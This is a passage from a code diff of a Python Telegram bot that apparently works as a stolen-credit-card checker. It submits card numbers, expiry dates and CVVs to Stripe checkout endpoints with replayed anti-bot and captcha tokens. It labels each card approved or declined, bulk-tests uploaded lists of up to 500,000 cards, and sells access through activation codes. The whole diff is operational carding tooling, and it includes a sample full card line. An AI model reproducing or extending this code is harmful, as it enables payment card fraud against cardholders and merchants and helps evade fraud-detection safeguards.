+        data = f'type=card&card[number]={formatted_cc}&card[cvc]={cvv}&card[exp_month]={mm.zfill(2)}&card[exp_year]={yy}&billing_details[name]=Devx+devx&billing_details[email]=devxtube4%40gmail.com&billing_details[address][country]=MA&guid={GUID}&muid={MUID}&sid={SID}&key={STRIPE_3D_KEY}&payment_user_agent=stripe.js%2F054be538d9%3B+stripe-js-v3%2F054be538d9%3B+checkout&client_attribution_metadata[client_session_id]={CLIENT_SESSION_ID}&client_attribution_metadata[checkout_session_id]={CHECKOUT_SESSION_ID}&client_attribution_metadata[merchant_integration_source]=checkout&client_attribution_metadata[merchant_integration_version]=embedded_checkout&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[checkout_config_id]={CHECKOUT_CONFIG_ID}'
+        
+        headers = {
+            'accept': 'application/json',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
+        }
+        
+        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
+        pm_result = response.json()
+        
+        if 'id' not in pm_result:
+            return "ERROR"
+        
+        pm_id = pm_result['id']
+        
+        data2 = f'eid=NA&payment_method={pm_id}&expected_amount=300&last_displayed_line_item_group_details[subtotal]=300&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&guid={GUID}&muid={MUID}&sid={SID}&key={STRIPE_3D_KEY}&version=054be538d9&init_checksum=IwpbSDQclSJWG0FBmoQzlLmm0ZJgJ7tS&js_checksum=qto~d%5En0%3DQU%3Eazbu%5D%5D%5EOYtl%60M%24qR+%7BYO%24Lduo%7B%5CQDc%5CyYU%5C%5Eo%3FU%5E%60w&px3=e5007c82d306938852ac834dd9385d553f5b935e4bf6de0911670a2935084fd6%3AEq2S52a0Sj06xwDYqkeKFJh3sP6ZLBwiM7jLgq0JA2dGxAQ7hDuYkZBnHQiueEuwe54rCK7uwqNfMJUNSSfr3w%3D%3D%3A1000%3AhEfb0kCXEtuHb2igYrWcyU%2F1t7cVy59j1aXrCqRuw1WDGLsJwtG0aYRoRg4eqkbzZIL%2Fl3xSWJXtJBTLDxJ2eSQCkVUUhyUohv5GT%2Fdt8XTrrVgckeBq8pj78tcs2AvfQx1wnIyaqY%2F8Ku3S5IqsCurLezI%2BVIoWj1GWwwJ0sFzme54tcJjR7cudnPtBT7xAsksJAK7yipyerSsgH2M7ep6glATR9iFlbM6OfOmFyns%2BRQBlWcx0iLeKv44GUvFxIJ8XuQkGDpNSDsgKHDCyEi3UROnXnO8oAa8D5QH%2BUj9n9KEigzuvUfvwSvrXCxhfTHUaUo3K8HMgigRiWYMpuK9PelfdJs0auC%2Fsn0YJGKVUU%2Foo%2BCS2lqDDqZBDscHklPkLplUZDQoVhEwE1qto3XVcn%2F9N6G0G077gLDOS6fcy0K%2Bez8AHsKNgyQfeWb52MYJ4QRAvSCo4H4RpuA%2FbYAv8UWluRmHnn9ZugqSwX3U3gRXVHDd7jgqU16On20jDyJnpbpPQI4I4MOPHGZIbMEL7bN01MUr9ugavx4QE7XAQpdLdkTuLFtlRLa8uEJPh&pxvid=83b160d9-3802-11f1-95dd-7e56af6e6f09&pxcts=83b1683b-3802-11f1-95de-f7a9bc34e8b1&passive_captcha_token={PASSIVE_CAPTCHA_TOKEN}&passive_captcha_ekey=&rv_timestamp=qto%3En%3CQ%3DU%26CyY%26%60%3EX%5Er%3CYNr%3CYN%60%3CY_C%3CY_C%3CY%5E%60zY_%60%3CY%5En%7BU%3Eo%26U%26CyY_L%24e%3DL%23Yu%3Cs%5BO%24sX%26n%3DYO%24y%5BbXD%5BOXC%5BRP%24eRXCeOLCdbP%23Y%26avetn%7BU%3Ee%26U%26CyXbQs%5BOP%3D%5B_T%3C%5B_%5C%3BX%26Yy%5BOMsYOUy%5BbL%3DeOYvYOnDX_QreR%5DudOTD%5BRQxeuayYu%60%3CYxMr%5BR%5DxXxd%3D%5B_%23%3E%5B_T%3CX%5Eo%3FU%5E%60w&client_attribution_metadata[client_session_id]={CLIENT_SESSION_ID}&client_attribution_metadata[checkout_session_id]={CHECKOUT_SESSION_ID}&client_attribution_metadata[merchant_integration_source]=checkout&client_attribution_metadata[merchant_integration_version]=embedded_checkout&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[checkout_config_id]={CHECKOUT_CONFIG_ID}'
+        
+        response2 = requests.post(f'https://api.stripe.com/v1/payment_pages/{CHECKOUT_SESSION_ID}/confirm', headers=headers, data=data2, timeout=30)
+        result = response2.json()
+        
+        if response2.status_code == 200 and result.get('payment_intent', {}).get('status') == 'succeeded':
+            return "APPROVED"
+        else:
+            return "DECLINED"
+            
+    except Exception as e:
+        return "ERROR"
 
 # =============== أوامر البوت ===============
 @bot.message_handler(commands=["start"])
-def start_command(message):
+def start(message):
     user_id = message.chat.id
-    
-    if user_id in ADMINS:
+    if user_id == ADMIN_ID:
         markup = types.InlineKeyboardMarkup(row_width=1)
         markup.add(
-            types.InlineKeyboardButton("🔐 Create Code", callback_data="create_code"),
-            types.InlineKeyboardButton("📊 Active Codes", callback_data="list_codes"),
-            types.InlineKeyboardButton("👥 Users", callback_data="list_users")
+            types.InlineKeyboardButton("🔐 إنشاء كود جديد", callback_data="create_code"),
+            types.InlineKeyboardButton("📊 الكودات النشطة", callback_data="list_codes"),
+            types.InlineKeyboardButton("👥 المستخدمين", callback_data="list_users")
         )
-        
-        bot.reply_to(message, f"""
-✅ <b>Stripe Checker Bot</b>
-━━━━━━━━━━━━━━━━━━━━━
-👑 <b>Admin Panel</b>
-━━━━━━━━━━━━━━━━━━━━━
-📌 <b>Commands:</b>
-/chk CC|MM|YY|CVV - Check card
-/combo - Check file
-/status - Gateways status
-/update - Update gateways
-/gateway - Select gateway
-/gencode days - Create code
-/activate code - Activate code
-━━━━━━━━━━━━━━━━━━━━━
-{VERSION} | {DEV} | {AUTHOR}
-""", parse_mode='HTML', reply_markup=markup)
+        welcome = f"""
+◈ 𝗠𝗨𝗟𝗧𝗜 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ◈
+◈ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 | 𝗦𝗧𝗥𝗜𝗣𝗘 $𝟯 ◈
+━━━━━━━━━━━━━━━━━━━━━━
+✧ {VERSION}
+✧ {AUTHOR}
+━━━━━━━━━━━━━━━━━━━━━━
+✧ /start – ᴍᴇɴᴜ
+✧ /chk ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ – ᴄʜᴇᴄᴋ ᴄᴀʀᴅ
+✧ /stats – ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ
+━━━━━━━━━━━━━━━━━━━━━━
+✧ ꜱᴇɴᴅ ᴛxᴛ ꜰɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ ᴍᴀꜱꜱ ᴄᴀʀᴅꜱ
+✧ ᴇxᴀᴍᴘʟᴇ: 4758330003566608|05|27|350
+"""
+        bot.reply_to(message, welcome, reply_markup=markup, parse_mode='HTML')
     elif is_authorized(user_id):
         expiry = get_user_expiry(user_id)
-        bot.reply_to(message, f"""
-✅ <b>Welcome</b>
-━━━━━━━━━━━━━━━━━━━━━
-📅 Expires: {expiry}
-━━━━━━━━━━━━━━━━━━━━━
-📌 <b>Commands:</b>
-/chk CC|MM|YY|CVV
-/combo - Check file
-/status - Gateways status
-/gateway - Select gateway
-━━━━━━━━━━━━━━━━━━━━━
-{VERSION} | {DEV} | {AUTHOR}
-""", parse_mode='HTML')
+        welcome = f"""
+◈ 𝗠𝗨𝗟𝗧𝗜 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ◈
+◈ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 | 𝗦𝗧𝗥𝗜𝗣𝗘 $𝟯 ◈
+━━━━━━━━━━━━━━━━━━━━━━
+✧ {VERSION}
+✧ {AUTHOR}
+━━━━━━━━━━━━━━━━━━━━━━
+✧ /start – ᴍᴇɴᴜ
+✧ /chk ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ – ᴄʜᴇᴄᴋ ᴄᴀʀᴅ
+✧ /stats – ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ
+━━━━━━━━━━━━━━━━━━━━━━
+✧ صلاحيتك تنتهي: {expiry}
+━━━━━━━━━━━━━━━━━━━━━━
+✧ ꜱᴇɴᴅ ᴛxᴛ ꜰɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ ᴍᴀꜱꜱ ᴄᴀʀᴅꜱ
+"""
+        bot.reply_to(message, welcome, parse_mode='HTML')
     else:
-        bot.reply_to(message, f"""
-❌ <b>ACCESS DENIED</b>
-━━━━━━━━━━━━━━━━━━━━━
-Please enter activation code
-━━━━━━━━━━━━━━━━━━━━━
-Contact: {DEV} | {AUTHOR}
-""", parse_mode='HTML')
+        bot.reply_to(message, f"❌ ACCESS DENIED\n✧ يرجى إدخال كود التفعيل\n✧ تواصل مع {DEV}", parse_mode='HTML')
 
 @bot.message_handler(commands=["activate"])
 def activate(message):
@@ -450,256 +318,68 @@ def activate(message):
     code = message.text.replace('/activate ', '').strip()
     
     if activate_user_code(user_id, code):
-        bot.reply_to(message, "✅ <b>Code activated successfully!</b>\nYou can now use the bot", parse_mode='HTML')
+        bot.reply_to(message, "✅ تم تفعيل الكود بنجاح!\nيمكنك الآن استخدام البوت", parse_mode='HTML')
     else:
-        bot.reply_to(message, "❌ <b>Invalid or expired code!</b>", parse_mode='HTML')
+        bot.reply_to(message, "❌ كود غير صالح أو منتهي الصلاحية!", parse_mode='HTML')
 
 @bot.message_handler(commands=["gencode"])
 def gen_code(message):
-    user_id = message.chat.id
-    if user_id not in ADMINS:
-        bot.reply_to(message, "❌ ACCESS DENIED")
+    """أمر مباشر لإنشاء كود (لأدمن فقط)"""
+    if message.from_user.id != ADMIN_ID:
+        bot.reply_to(message, "❌ ACCESS DENIED", parse_mode='HTML')
         return
     
     try:
         parts = message.text.split()
         if len(parts) < 2:
-            bot.reply_to(message, "❌ Usage: /gencode <days>\nExample: /gencode 30", parse_mode='HTML')
+            bot.reply_to(message, "❌ استخدم: /gencode <عدد الأيام>\nمثال: /gencode 10", parse_mode='HTML')
             return
         
         days = int(parts[1])
+        
         if days <= 0:
-            bot.reply_to(message, "❌ Days must be greater than 0", parse_mode='HTML')
+            bot.reply_to(message, "❌ يجب أن يكون الرقم أكبر من 0", parse_mode='HTML')
             return
         
         code = generate_user_code(days)
+        
         bot.reply_to(message, f"""
-✅ <b>Code created!</b>
+✅ <b>تم إنشاء الكود!</b>
 ━━━━━━━━━━━━━━━━━━━━━
 🔑 <code>{code}</code>
-📅 {days} days
+📅 {days} يوم
 ━━━━━━━━━━━━━━━━━━━━━
-Send to user: <code>/activate {code}</code>
+أرسل للمستخدم: <code>/activate {code}</code>
 """, parse_mode='HTML')
     except ValueError:
-        bot.reply_to(message, "❌ Please enter a valid number", parse_mode='HTML')
+        bot.reply_to(message, "❌ يرجى إدخال رقم صحيح (مثال: /gencode 10)", parse_mode='HTML')
 
-@bot.callback_query_handler(func=lambda call: call.data == 'create_code')
-def create_code_callback(call):
-    if call.from_user.id not in ADMINS:
-        bot.answer_callback_query(call.id, "❌ Admin only")
+@bot.message_handler(commands=["stats"])
+def stats(message):
+    user_id = message.chat.id
+    if not is_authorized(user_id):
+        bot.reply_to(message, "❌ ACCESS DENIED")
         return
     
-    msg = bot.send_message(call.from_user.id, "📝 Enter days (example: 30):", parse_mode='HTML')
-    bot.register_next_step_handler(msg, get_code_days)
-
-def get_code_days(message):
-    try:
-        days = int(message.text.strip())
-        if days <= 0:
-            bot.send_message(message.chat.id, "❌ Days must be greater than 0", parse_mode='HTML')
-            return
-        
-        code = generate_user_code(days)
-        bot.send_message(message.chat.id, f"""
-✅ <b>Code created!</b>
+    bot.reply_to(message, f"""
+📊 <b>STATISTICS</b>
 ━━━━━━━━━━━━━━━━━━━━━
-🔑 <code>{code}</code>
-📅 {days} days
+✧ ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ: {len(user_codes) + len(AUTHORIZED_USERS)}
+✧ ᴀᴄᴛɪᴠᴇ ᴄᴏᴅᴇꜱ: {len(pending_codes)}
+✧ ᴀᴅᴍɪɴꜱ: 1
 ━━━━━━━━━━━━━━━━━━━━━
-Send to user: <code>/activate {code}</code>
+✧ ɢᴀᴛᴇᴡᴀʏ 1: {GATEWAY_AUTH}
+✧ ɢᴀᴛᴇᴡᴀʏ 2: {GATEWAY_3D}
+━━━━━━━━━━━━━━━━━━━━━
+✧ {VERSION}
+✧ {AUTHOR}
 """, parse_mode='HTML')
-    except ValueError:
-        bot.send_message(message.chat.id, "❌ Please enter a valid number", parse_mode='HTML')
-
-@bot.callback_query_handler(func=lambda call: call.data == 'list_codes')
-def list_codes_callback(call):
-    if call.from_user.id not in ADMINS:
-        bot.answer_callback_query(call.id, "❌ Admin only")
-        return
-    
-    if not pending_codes:
-        bot.send_message(call.from_user.id, "📭 No active codes", parse_mode='HTML')
-        return
-    
-    msg = "📋 <b>Active codes:</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
-    for code, data in pending_codes.items():
-        expiry = datetime.fromtimestamp(data['expiry']).strftime('%Y-%m-%d %H:%M:%S')
-        msg += f"\n🔑 <code>{code}</code>\n   📅 Expires: {expiry}\n"
-    
-    bot.send_message(call.from_user.id, msg, parse_mode='HTML')
-
-@bot.callback_query_handler(func=lambda call: call.data == 'list_users')
-def list_users_callback(call):
-    if call.from_user.id not in ADMINS:
-        bot.answer_callback_query(call.id, "❌ Admin only")
-        return
-    
-    if not user_codes:
-        bot.send_message(call.from_user.id, "📭 No active users", parse_mode='HTML')
-        return
-    
-    msg = "👥 <b>Active users:</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
-    for uid, data in user_codes.items():
-        expiry = datetime.fromtimestamp(data['expiry']).strftime('%Y-%m-%d %H:%M:%S')
-        msg += f"\n🆔 <code>{uid}</code>\n   📅 Expires: {expiry}\n"
-    
-    bot.send_message(call.from_user.id, msg, parse_mode='HTML')
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("gateway_"))
-def gateway_callback(call):
-    global selected_gateway_index
-    if call.from_user.id not in ADMINS and not is_authorized(call.from_user.id):
-        bot.answer_callback_query(call.id, "❌ Not authorized")
-        return
-    
-    idx = int(call.data.split("_")[1])
-    selected_gateway_index = idx
-    bot.answer_callback_query(call.id, f"✅ Selected {GATEWAYS[idx]['name']}")
-    
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    for i, g in enumerate(GATEWAYS):
-        status = "✅" if g['active'] else "❌"
-        marker = "👉 " if i == selected_gateway_index else ""
-        markup.add(types.InlineKeyboardButton(f"{marker}{status} {g['name']}", callback_data=f"gateway_{i}"))
-    
-    bot.edit_message_text(f"✅ Gateway selected: {GATEWAYS[idx]['name']}\n━━━━━━━━━━━━━━━━━━━━━\nUse /chk to check card", 
-                          call.message.chat.id, call.message.message_id, reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("combo_gateway_"))
-def combo_gateway_callback(call):
-    user_id = call.from_user.id
-    if user_id not in ADMINS and not is_authorized(user_id):
-        bot.answer_callback_query(call.id, "❌ Not authorized")
-        return
-    
-    idx = int(call.data.split("_")[2])
-    file_id = call.data.split("_")[3]
-    
-    if file_id in temp_files:
-        cards = temp_files[file_id]['cards']
-        total = len(cards)
-        
-        bot.answer_callback_query(call.id, f"✅ Starting check on {GATEWAYS[idx]['name']}")
-        
-        status_msg = bot.edit_message_text(f"🚀 Checking {total} cards on {GATEWAYS[idx]['name']}...\n━━━━━━━━━━━━━━━━━━━━━", 
-                                           call.message.chat.id, call.message.message_id)
-        
-        gateway = GATEWAYS[idx]
-        
-        approved = 0
-        declined = 0
-        results_list = []
-        
-        for i, card in enumerate(cards, 1):
-            # كل بطاقة تاخذ SetupIntent جديد
-            result = check_card_with_gateway(card, gateway)
-            
-            if "APPROVED" in result:
-                approved += 1
-                bin_info = get_bin_info(card.split('|')[0][:6])
-                
-                msg = f"""
-✅ <b>VALID CARD FOUND!</b>
-━━━━━━━━━━━━━━━━━━━━━
-💳 <code>{card}</code>
-━━━━━━━━━━━━━━━━━━━━━
-🔐 <b>{gateway['name']}</b>
-📌 {result}
-━━━━━━━━━━━━━━━━━━━━━
-🏦 {bin_info['bank']}
-🌍 {bin_info['emoji']} {bin_info['country']}
-💳 {bin_info['scheme']} - {bin_info['type']}
-━━━━━━━━━━━━━━━━━━━━━
-⚡ {DEV} | {AUTHOR}
-"""
-                bot.send_message(call.message.chat.id, msg, parse_mode='HTML')
-            else:
-                declined += 1
-                results_list.append(f"💳 <code>{card[:12]}...</code> → {result}")
-            
-            if i % 3 == 0 or i == total:
-                recent_results = "\n".join(results_list[-6:]) if results_list else "No results yet"
-                progress_text = f"""
-📊 <b>Checking progress</b>
-━━━━━━━━━━━━━━━━━━━━━
-🔐 {gateway['name']}
-📌 [{i}/{total}] | ✅ {approved} | ❌ {declined}
-━━━━━━━━━━━━━━━━━━━━━
-<b>Recent results:</b>
-{recent_results}
-"""
-                try:
-                    bot.edit_message_text(progress_text, call.message.chat.id, status_msg.message_id, parse_mode='HTML')
-                except:
-                    pass
-            
-            time.sleep(0.5)  # تأخير بسيط بين الطلبات
-        
-        final = f"""
-✅ <b>Completed!</b>
-━━━━━━━━━━━━━━━━━━━━━
-📊 Total: {total}
-✅ Approved: {approved}
-❌ Declined: {declined}
-🔐 Gateway: {gateway['name']}
-━━━━━━━━━━━━━━━━━━━━━
-⚡ {DEV} | {AUTHOR}
-"""
-        bot.edit_message_text(final, call.message.chat.id, status_msg.message_id, parse_mode='HTML')
-        del temp_files[file_id]
-
-@bot.message_handler(commands=["gateway"])
-def gateway_command(message):
-    user_id = message.chat.id
-    if user_id not in ADMINS and not is_authorized(user_id):
-        bot.reply_to(message, "❌ ACCESS DENIED")
-        return
-    
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    for i, g in enumerate(GATEWAYS):
-        status = "✅" if g['active'] else "❌"
-        marker = "👉 " if i == selected_gateway_index else ""
-        markup.add(types.InlineKeyboardButton(f"{marker}{status} {g['name']}", callback_data=f"gateway_{i}"))
-    
-    bot.reply_to(message, "🔐 <b>Select gateway:</b>", parse_mode='HTML', reply_markup=markup)
-
-@bot.message_handler(commands=["status"])
-def status_command(message):
-    user_id = message.chat.id
-    if user_id not in ADMINS and not is_authorized(user_id):
-        bot.reply_to(message, "❌ ACCESS DENIED")
-        return
-    
-    status_text = "📊 <b>Gateways Status</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
-    for g in GATEWAYS:
-        status_text += f"{'✅' if g['active'] else '❌'} {g['name']}\n"
-        if not g['active'] and g['last_error']:
-            status_text += f"   ⚠️ {g['last_error']}\n"
-    status_text += f"\n🔐 Selected: {GATEWAYS[selected_gateway_index]['name']}"
-    
-    bot.reply_to(message, status_text, parse_mode='HTML')
-
-@bot.message_handler(commands=["update"])
-def update_command(message):
-    user_id = message.chat.id
-    if user_id not in ADMINS and not is_authorized(user_id):
-        bot.reply_to(message, "❌ ACCESS DENIED")
-        return
-    
-    msg = bot.reply_to(message, "🔄 Updating gateways...")
-    
-    def update_thread():
-        update_all_gateways()
-        bot.edit_message_text("✅ All gateways updated", message.chat.id, msg.message_id)
-    
-    threading.Thread(target=update_thread, daemon=True).start()
 
 @bot.message_handler(commands=["chk"])
-def check_command(message):
+def check_single(message):
     user_id = message.chat.id
-    if user_id not in ADMINS and not is_authorized(user_id):
-        bot.reply_to(message, "❌ ACCESS DENIED\nUse /activate <code>", parse_mode='HTML')
+    if not is_authorized(user_id):
+        bot.reply_to(message, "❌ ACCESS DENIED\nيرجى استخدام /activate <الكود>", parse_mode='HTML')
         return
     
     try:
@@ -707,110 +387,245 @@ def check_command(message):
         parts = card.split('|')
         
         if len(parts) < 4:
-            bot.reply_to(message, "❌ Invalid format!\nUse: /chk CC|MM|YY|CVV", parse_mode='HTML')
+            bot.reply_to(message, "❌ صيغة غير صحيحة!\nاستخدم: <code>/chk CC|MM|YY|CVV</code>", parse_mode='HTML')
             return
         
-        status_msg = bot.reply_to(message, "⌛ Checking...")
+        status_msg = bot.send_message(user_id, "⌛ جاري الفحص على البوابتين...", parse_mode='HTML')
         
-        gateway = GATEWAYS[selected_gateway_index]
-        
-        result = check_card_with_gateway(card, gateway)
+        result_auth = check_card_auth(card)
+        result_3d = check_card_3d(card)
         
         bin_info = get_bin_info(parts[0][:6])
         
-        result_text = f"""
-🔍 <b>Result</b>
+        msg = f"""
+◈ <b>MULTI GATEWAY RESULT</b> ◈
 ━━━━━━━━━━━━━━━━━━━━━
-💳 <code>{card}</code>
+💳 <b>CC:</b> <code>{card}</code>
+📅 {parts[1]}/{parts[2]}
 ━━━━━━━━━━━━━━━━━━━━━
-🔐 <b>{gateway['name']}</b>
-📌 {result}
+🔐 <b>{GATEWAY_AUTH}</b>
+📌 {result_auth}
+━━━━━━━━━━━━━━━━━━━━━
+💳 <b>{GATEWAY_3D}</b>
+📌 {result_3d}
 ━━━━━━━━━━━━━━━━━━━━━
 🏦 {bin_info['bank']}
 🌍 {bin_info['emoji']} {bin_info['country']}
 💳 {bin_info['scheme']} - {bin_info['type']}
 ━━━━━━━━━━━━━━━━━━━━━
-⚡ {DEV} | {AUTHOR}
-"""
-        bot.edit_message_text(result_text, message.chat.id, status_msg.message_id, parse_mode='HTML')
+⚡ {VERSION}
+👤 {AUTHOR}"""
+        
+        bot.edit_message_text(msg, user_id, status_msg.message_id, parse_mode='HTML')
         
     except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)[:100]}", parse_mode='HTML')
+        bot.reply_to(message, f"❌ خطأ: {str(e)[:100]}", parse_mode='HTML')
 
 @bot.message_handler(commands=["combo"])
 def combo_command(message):
     user_id = message.chat.id
-    if user_id not in ADMINS and not is_authorized(user_id):
-        bot.reply_to(message, "❌ ACCESS DENIED")
+    if not is_authorized(user_id):
+        bot.reply_to(message, "❌ ACCESS DENIED", parse_mode='HTML')
         return
     
     bot.reply_to(message, """
-📁 <b>Combo Check - Bulk</b>
+📁 <b>فحص كومبو - دفعة واحدة</b>
 ━━━━━━━━━━━━━━━━━━━━━
-Send a <b>.txt</b> file with one card per line
+أرسل ملف <b>.txt</b> يحتوي على بطاقة لكل سطر
 
-📝 <b>Format:</b>
+📝 <b>التنسيق:</b>
 <code>CC|MM|YY|CVV</code>
 
-<b>Example:</b>
+<b>مثال:</b>
 <code>4758330003566608|05|27|350</code>
 
-⚠️ After sending, select gateway
-✅ Only valid cards will be sent
-✅ Fresh SetupIntent for each card
+⚠️ الحد الأقصى: 30 بطاقة
+✅ سيعرض فقط البطاقات الصالحة
 """, parse_mode='HTML')
 
 @bot.message_handler(content_types=["document"])
-def handle_combo_file(message):
+def handle_file(message):
     user_id = message.chat.id
-    if user_id not in ADMINS and not is_authorized(user_id):
-        bot.reply_to(message, "❌ ACCESS DENIED")
+    if not is_authorized(user_id):
+        bot.reply_to(message, "❌ ACCESS DENIED", parse_mode='HTML')
         return
+    
+    global stop_flag
+    stop_flag = False
+    
+    status_msg = bot.send_message(user_id, "📂 جاري تحميل الملف...", parse_mode='HTML')
     
     try:
         file_info = bot.get_file(message.document.file_id)
         downloaded = bot.download_file(file_info.file_path)
         content = downloaded.decode('utf-8')
+    except Exception as e:
+        bot.edit_message_text(f"❌ خطأ: {str(e)[:50]}", user_id, status_msg.message_id, parse_mode='HTML')
+        return
+    
+    cards = [line.strip() for line in content.split('\n') if line.strip() and '|' in line]
+    total = len(cards)
+    
+    if total == 0:
+        bot.edit_message_text("❌ لم يتم العثور على بطاقات!", user_id, status_msg.message_id, parse_mode='HTML')
+        return
+    
+    if total > 500000:
+        bot.edit_message_text(f"⚠️ الحد الأقصى 5000000 بطاقة", user_id, status_msg.message_id, parse_mode='HTML')
+        return
+    
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(types.InlineKeyboardButton("⏹️ إيقاف الفحص", callback_data='stop'))
+    
+    bot.edit_message_text(f"⚡ بدء فحص {total} بطاقة...", user_id, status_msg.message_id, reply_markup=markup, parse_mode='HTML')
+    
+    good_auth = 0
+    good_3d = 0
+    valid_cards = []
+    
+    for i, card in enumerate(cards, 1):
+        if stop_flags.get(user_id, False):
+            bot.edit_message_text("⏹️ تم الإيقاف", user_id, status_msg.message_id, parse_mode='HTML')
+            break
         
-        cards = extract_cards_from_text(content)
+        result_auth = check_card_auth(card)
+        result_3d = check_card_3d(card)
         
-        if not cards:
-            bot.reply_to(message, "❌ No valid cards found in file")
-            return
-        
-        total = len(cards)
-        file_id = str(message.message_id)
-        temp_files[file_id] = {'cards': cards, 'total': total}
+        if "APPROVED" in result_auth or "APPROVED" in result_3d:
+            valid_cards.append(card)
+            
+            if "APPROVED" in result_auth:
+                good_auth += 1
+            if "APPROVED" in result_3d:
+                good_3d += 1
+            
+            # إرسال البطاقة الصالحة فوراً
+            bin_info = get_bin_info(card.split('|')[0][:6])
+            msg = f"""
+✅ <b>VALID CARD FOUND!</b>
+━━━━━━━━━━━━━━━━━━━━━
+💳 <code>{card}</code>
+━━━━━━━━━━━━━━━━━━━━━
+🔐 AUTH: {result_auth}
+💳 $3: {result_3d}
+━━━━━━━━━━━━━━━━━━━━━
+🏦 {bin_info['bank']} | {bin_info['emoji']} {bin_info['country']}
+💳 {bin_info['scheme']} - {bin_info['type']}
+━━━━━━━━━━━━━━━━━━━━━
+⚡ {VERSION}
+👤 {AUTHOR}"""
+            bot.send_message(user_id, msg, parse_mode='HTML')
         
         markup = types.InlineKeyboardMarkup(row_width=1)
-        for i, g in enumerate(GATEWAYS):
-            status = "✅" if g['active'] else "❌"
-            markup.add(types.InlineKeyboardButton(f"{status} {g['name']}", callback_data=f"combo_gateway_{i}_{file_id}"))
+        markup.add(
+            types.InlineKeyboardButton(f"✅ AUTH: {good_auth}", callback_data='x'),
+            types.InlineKeyboardButton(f"💰 $3: {good_3d}", callback_data='x'),
+            types.InlineKeyboardButton(f"📊 [{i}/{total}]", callback_data='x'),
+            types.InlineKeyboardButton("⏹️ إيقاف", callback_data='stop')
+        )
         
-        bot.reply_to(message, f"""
-📁 <b>File loaded!</b>
+        bot.edit_message_text(f"🔍 جاري فحص: {card[:10]}...\n✅ AUTH: {good_auth}\n💰 $3: {good_3d}", user_id, status_msg.message_id, reply_markup=markup, parse_mode='HTML')
+        time.sleep(2)
+    
+    final = f"""
+✅ <b>COMPLETED</b>
 ━━━━━━━━━━━━━━━━━━━━━
-📊 Total cards: {total}
+🔐 AUTH APPROVED: {good_auth}
+💳 $3 APPROVED: {good_3d}
+✅ VALID CARDS: {len(valid_cards)}
+⚡ TOTAL CHECKED: {total}
 ━━━━━━━━━━━━━━━━━━━━━
-🔐 <b>Select gateway:</b>
-""", parse_mode='HTML', reply_markup=markup)
+⚡ {VERSION}
+👤 {AUTHOR}"""
+    
+    bot.edit_message_text(final, user_id, status_msg.message_id, parse_mode='HTML')
+    stop_flags[user_id] = False
+
+# =============== أوامر الأدمن (الكودات) ===============
+@bot.callback_query_handler(func=lambda call: call.data == 'create_code')
+def create_code_callback(call):
+    if call.from_user.id != ADMIN_ID:
+        bot.answer_callback_query(call.id, "❌ هذا الأمر للأدمن فقط")
+        return
+    
+    msg = bot.send_message(call.from_user.id, "📝 أرسل مدة الصلاحية (بالأيام):\nمثال: 30", parse_mode='HTML')
+    bot.register_next_step_handler(msg, get_code_days)
+
+def get_code_days(message):
+    try:
+        days = int(message.text.strip())
         
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")
+        if days <= 0:
+            bot.send_message(message.chat.id, "❌ يجب أن يكون الرقم أكبر من 0", parse_mode='HTML')
+            return
+        
+        code = generate_user_code(days)
+        bot.send_message(message.chat.id, f"""
+✅ <b>تم إنشاء الكود بنجاح!</b>
+━━━━━━━━━━━━━━━━━━━━━
+🔑 <b>الكود:</b> <code>{code}</code>
+📅 <b>الصلاحية:</b> {days} يوم
+━━━━━━━━━━━━━━━━━━━━━
+أرسل للمستخدم: <code>/activate {code}</code>
+""", parse_mode='HTML')
+    except ValueError:
+        bot.send_message(message.chat.id, "❌ خطأ! يرجى إدخال رقم صحيح (مثال: 10)", parse_mode='HTML')
+
+@bot.callback_query_handler(func=lambda call: call.data == 'list_codes')
+def list_codes_callback(call):
+    if call.from_user.id != ADMIN_ID:
+        bot.answer_callback_query(call.id, "❌ هذا الأمر للأدمن فقط")
+        return
+    
+    if not pending_codes:
+        bot.send_message(call.from_user.id, "📭 لا توجد كودات نشطة", parse_mode='HTML')
+        return
+    
+    msg = "📋 <b>الكودات النشطة:</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
+    for code, data in pending_codes.items():
+        expiry = datetime.fromtimestamp(data['expiry']).strftime('%Y-%m-%d %H:%M:%S')
+        msg += f"\n🔑 <code>{code}</code>\n   📅 ينتهي: {expiry}\n"
+    
+    bot.send_message(call.from_user.id, msg, parse_mode='HTML')
+
+@bot.callback_query_handler(func=lambda call: call.data == 'list_users')
+def list_users_callback(call):
+    if call.from_user.id != ADMIN_ID:
+        bot.answer_callback_query(call.id, "❌ هذا الأمر للأدمن فقط")
+        return
+    
+    if not user_codes:
+        bot.send_message(call.from_user.id, "📭 لا يوجد مستخدمين نشطين", parse_mode='HTML')
+        return
+    
